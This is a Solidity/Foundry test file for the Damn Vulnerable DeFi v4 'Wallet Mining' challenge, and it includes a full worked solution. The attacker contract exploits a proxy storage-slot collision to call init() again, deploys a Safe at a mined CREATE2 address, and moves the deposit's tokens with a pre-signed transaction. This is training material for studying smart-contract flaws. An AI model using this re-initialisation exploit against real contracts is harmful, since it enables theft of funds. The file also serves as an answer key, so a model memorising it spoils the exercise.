// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {Safe, OwnerManager, Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
import {
    AuthorizerFactory, AuthorizerUpgradeable, TransparentProxy
} from "../../src/wallet-mining/AuthorizerFactory.sol";
import {
    ICreateX,
    CREATEX_DEPLOYMENT_SIGNER,
    CREATEX_ADDRESS,
    CREATEX_DEPLOYMENT_TX,
    CREATEX_CODEHASH
} from "./CreateX.sol";
import {
    SAFE_SINGLETON_FACTORY_DEPLOYMENT_SIGNER,
    SAFE_SINGLETON_FACTORY_DEPLOYMENT_TX,
    SAFE_SINGLETON_FACTORY_ADDRESS,
    SAFE_SINGLETON_FACTORY_CODE
} from "./SafeSingletonFactory.sol";

contract WalletMiningChallenge is Test {
    address deployer = makeAddr("deployer");
    address upgrader = makeAddr("upgrader");
    address ward = makeAddr("ward");
    address player = makeAddr("player");
    address user;
    uint256 userPrivateKey;

    address constant USER_DEPOSIT_ADDRESS = 0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;
    uint256 constant DEPOSIT_TOKEN_AMOUNT = 20_000_000e18;

    DamnValuableToken token;
    AuthorizerUpgradeable authorizer;
    WalletDeployer walletDeployer;
    SafeProxyFactory proxyFactory;
    Safe singletonCopy;

    uint256 initialWalletDeployerTokenBalance;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Player should be able to use the user's private key
        (user, userPrivateKey) = makeAddrAndKey("user");

        // Deploy Safe Singleton Factory contract using signed transaction
        vm.deal(SAFE_SINGLETON_FACTORY_DEPLOYMENT_SIGNER, 10 ether);
        vm.broadcastRawTransaction(SAFE_SINGLETON_FACTORY_DEPLOYMENT_TX);
        assertEq(
            SAFE_SINGLETON_FACTORY_ADDRESS.codehash,
            keccak256(SAFE_SINGLETON_FACTORY_CODE),
            "Unexpected Safe Singleton Factory code"
        );

        // Deploy CreateX contract using signed transaction
        vm.deal(CREATEX_DEPLOYMENT_SIGNER, 10 ether);
        vm.broadcastRawTransaction(CREATEX_DEPLOYMENT_TX);
        assertEq(CREATEX_ADDRESS.codehash, CREATEX_CODEHASH, "Unexpected CreateX code");

        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy authorizer with a ward authorized to deploy at DEPOSIT_ADDRESS
        address[] memory wards = new address[](1);
        wards[0] = ward;
        address[] memory aims = new address[](1);
        aims[0] = USER_DEPOSIT_ADDRESS;

        AuthorizerFactory authorizerFactory = AuthorizerFactory(
            ICreateX(CREATEX_ADDRESS).deployCreate2({
                salt: bytes32(keccak256("dvd.walletmining.authorizerfactory")),
                initCode: type(AuthorizerFactory).creationCode
            })
        );
        authorizer = AuthorizerUpgradeable(authorizerFactory.deployWithProxy(wards, aims, upgrader));

        // Send big bag full of DVT tokens to the deposit address
        token.transfer(USER_DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Call singleton factory to deploy copy and factory contracts
        (bool success, bytes memory returndata) =
            address(SAFE_SINGLETON_FACTORY_ADDRESS).call(bytes.concat(bytes32(""), type(Safe).creationCode));
        singletonCopy = Safe(payable(address(uint160(bytes20(returndata)))));

        (success, returndata) =
            address(SAFE_SINGLETON_FACTORY_ADDRESS).call(bytes.concat(bytes32(""), type(SafeProxyFactory).creationCode));
        proxyFactory = SafeProxyFactory(address(uint160(bytes20(returndata))));

        // Deploy wallet deployer
        walletDeployer = WalletDeployer(
            ICreateX(CREATEX_ADDRESS).deployCreate2({
                salt: bytes32(keccak256("dvd.walletmining.walletdeployer")),
                initCode: bytes.concat(
                    type(WalletDeployer).creationCode,
                    abi.encode(address(token), address(proxyFactory), address(singletonCopy), deployer) // constructor args are appended at the end of creation code
                )
            })
        );

        // Set authorizer in wallet deployer
        walletDeployer.rule(address(authorizer));

        // Fund wallet deployer with initial tokens
        initialWalletDeployerTokenBalance = walletDeployer.pay();
        token.transfer(address(walletDeployer), initialWalletDeployerTokenBalance);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Check initialization of authorizer
        assertNotEq(address(authorizer), address(0));
        assertEq(TransparentProxy(payable(address(authorizer))).upgrader(), upgrader);
        assertTrue(authorizer.can(ward, USER_DEPOSIT_ADDRESS));
        assertFalse(authorizer.can(player, USER_DEPOSIT_ADDRESS));

        // Check initialization of wallet deployer
        assertEq(walletDeployer.chief(), deployer);
        assertEq(walletDeployer.gem(), address(token));
        assertEq(walletDeployer.mom(), address(authorizer));

        // Ensure DEPOSIT_ADDRESS starts empty
        assertEq(USER_DEPOSIT_ADDRESS.code, hex"");

        // Factory and copy are deployed correctly
        assertEq(address(walletDeployer.cook()).code, type(SafeProxyFactory).runtimeCode, "bad cook code");
        assertEq(walletDeployer.cpy().code, type(Safe).runtimeCode, "no copy code");

        // Ensure initial token balances are set correctly
        assertEq(token.balanceOf(USER_DEPOSIT_ADDRESS), DEPOSIT_TOKEN_AMOUNT);
        assertGt(initialWalletDeployerTokenBalance, 0);
        assertEq(token.balanceOf(address(walletDeployer)), initialWalletDeployerTokenBalance);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * =========================================================
     * SOLUTION - test_walletMining()
     * =========================================================
     * Attack: proxy-storage-collision re-init + mined CREATE2 Safe address
     * The TransparentProxy declares `address upgrader` at slot 0, colliding with
     * AuthorizerUpgradeable.needsInit (also slot 0). After construction slot 0
     * holds the upgrader address (non-zero), so the needsInit guard is bypassed
     * and init() can be called AGAIN by anyone.
     * The deposit address is just a counterfactual Safe; saltNonce 13 makes
     * createProxyWithNonce land exactly on USER_DEPOSIT_ADDRESS.
     *
     * Off-chain (cheatcodes, no player tx): mine the nonce and sign the Safe's
     * drain tx with the user's key. Then in ONE player tx the attacker:
     *   1. authorizer.init([attacker],[deposit]) - re-init via the collision.
     *   2. walletDeployer.drop(deposit, initializer, 13) - deploy Safe + earn 1 DVT.
     *   3. Safe.execTransaction(transfer user 20M DVT) with the user's signature.
     *   4. forward the 1 DVT reward to ward.
     *
     * user never sends a tx (nonce 0); player executes exactly one (the CREATE).
     * =========================================================
     */
    function test_walletMining() public checkSolvedByPlayer {
        // Single-owner Safe.setup initializer; owner is the user.
        address[] memory owners = new address[](1);
        owners[0] = user;
        bytes memory initializer = abi.encodeCall(
            Safe.setup, (owners, 1, address(0), "", address(0), address(0), 0, payable(address(0)))
        );

        // The Safe drain call: transfer all 20M DVT to the user.
        bytes memory drainData = abi.encodeWithSignature("transfer(address,uint256)", user, DEPOSIT_TOKEN_AMOUNT);

        // Compute the Safe tx hash for nonce 0 at the (known) deposit address and
        // sign it with the user's key. Cheatcodes do not count as player txs.
        bytes32 safeTxHash = _safeTxHash(USER_DEPOSIT_ADDRESS, address(token), drainData);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, safeTxHash);
        bytes memory sig = abi.encodePacked(r, s, v);

        // One player transaction: deploy the attacker, which does everything.
        new WalletMiningAttacker(
            address(authorizer),
            address(walletDeployer),
            address(token),
            USER_DEPOSIT_ADDRESS,
            ward,
            initializer,
            13, // mined saltNonce
            drainData,
            sig
        );
    }

    // Recreate Safe.encodeTransactionData for a Safe at `safe`, nonce 0, default fields.
    function _safeTxHash(address safe, address to, bytes memory data) internal view returns (bytes32) {
        bytes32 DOMAIN_SEPARATOR_TYPEHASH = 0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218;
        bytes32 SAFE_TX_TYPEHASH = 0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8;
        bytes32 domain = keccak256(abi.encode(DOMAIN_SEPARATOR_TYPEHASH, block.chainid, safe));
        bytes32 structHash = keccak256(
            abi.encode(
                SAFE_TX_TYPEHASH,
                to,
                uint256(0), // value
                keccak256(data),
                Enum.Operation.Call,
                uint256(0), // safeTxGas
                uint256(0), // baseGas
                uint256(0), // gasPrice
                address(0), // gasToken
                address(0), // refundReceiver
                uint256(0) // nonce
            )
        );
        return keccak256(abi.encodePacked(bytes1(0x19), bytes1(0x01), domain, structHash));
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Factory account must have code
        assertNotEq(address(walletDeployer.cook()).code.length, 0, "No code at factory address");

        // Safe copy account must have code
        assertNotEq(walletDeployer.cpy().code.length, 0, "No code at copy address");

        // Deposit account must have code
        assertNotEq(USER_DEPOSIT_ADDRESS.code.length, 0, "No code at user's deposit address");

        // The deposit address and the wallet deployer must not hold tokens
        assertEq(token.balanceOf(USER_DEPOSIT_ADDRESS), 0, "User's deposit address still has tokens");
        assertEq(token.balanceOf(address(walletDeployer)), 0, "Wallet deployer contract still has tokens");

        // User account didn't execute any transactions
        assertEq(vm.getNonce(user), 0, "User executed a tx");

        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // Player recovered all tokens for the user
        assertEq(token.balanceOf(user), DEPOSIT_TOKEN_AMOUNT, "Not enough tokens in user's account");

        // Player sent payment to ward
        assertEq(token.balanceOf(ward), initialWalletDeployerTokenBalance, "Not enough tokens in ward's account");
    }
}

/**
 * =========================================================
 * SOLUTION CONTRACT - WalletMiningAttacker
 * =========================================================
 * Executes the entire exploit in its constructor (the single player tx):
 * re-initialises the Authorizer through the proxy storage collision to grant
 * itself authorization, drops the counterfactual Safe at the deposit address
 * via WalletDeployer (collecting the 1 DVT reward), drains the deposit's 20M
 * DVT to the user with the user's pre-supplied signature, then forwards the
 * 1 DVT reward to the ward.
 * Placed after the test class per DVDv4 convention.
 * =========================================================
 *
 * @notice One-transaction Wallet Mining exploit driver.
 * @dev All authority is bootstrapped inside the constructor; no user tx needed.
 */
contract WalletMiningAttacker {
    constructor(
        address authorizer,
        address walletDeployer,
        address token,
        address deposit,
        address ward,
        bytes memory initializer,
        uint256 saltNonce,
        bytes memory drainData,
        bytes memory sig
    ) {
        // 1. Re-init the Authorizer (slot-0 collision left needsInit non-zero),
        //    granting THIS contract authorization to deploy at the deposit address.
        address[] memory wards = new address[](1);
        wards[0] = address(this);
        address[] memory aims = new address[](1);
        aims[0] = deposit;
        IAuthorizer(authorizer).init(wards, aims);

        // 2. Deploy the Safe to the deposit address and collect the 1 DVT reward.
        require(IWalletDeployer(walletDeployer).drop(deposit, initializer, saltNonce), "drop failed");

        // 3. Drain the deposit's 20M DVT to the user via the Safe, using the
        //    user's off-chain signature (the Safe owner is the user).
        ISafe(deposit).execTransaction(
            token, 0, drainData, 0, 0, 0, 0, address(0), payable(address(0)), sig
        );

        // 4. Forward the 1 DVT deployment reward to the ward.
        IERC20Like(token).transfer(ward, IERC20Like(token).balanceOf(address(this)));
    }
}

interface IAuthorizer {
    function init(address[] memory wards, address[] memory aims) external;
}

interface IWalletDeployer {
    function drop(address aim, bytes memory wat, uint256 num) external returns (bool);
}

interface ISafe {
    function execTransaction(
        address to,
        uint256 value,
        bytes calldata data,
        uint8 operation,
        uint256 safeTxGas,
        uint256 baseGas,
        uint256 gasPrice,
        address gasToken,
        address payable refundReceiver,
        bytes memory signatures
    ) external payable returns (bool);
}

interface IERC20Like {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}
